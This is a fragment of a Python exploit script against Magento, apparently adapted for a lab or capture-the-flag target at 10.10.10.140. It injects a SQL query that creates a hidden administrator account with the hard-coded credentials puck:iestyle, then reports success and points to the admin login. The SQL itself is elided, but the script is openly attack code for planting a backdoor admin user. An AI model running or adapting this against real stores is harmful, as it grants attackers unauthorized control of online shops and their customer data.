...
#example usage python magento_createuser.py http://10.10.10.140
#WORKED
...
query = SQLQUERY.replace("\n", "").format(username="puck", password="iestyle")
...
if r.ok:
    print "WORKED"
    print "Check {0}/admin with creds puck:iestyle".format(target)
else:
    print "DID NOT WORK"
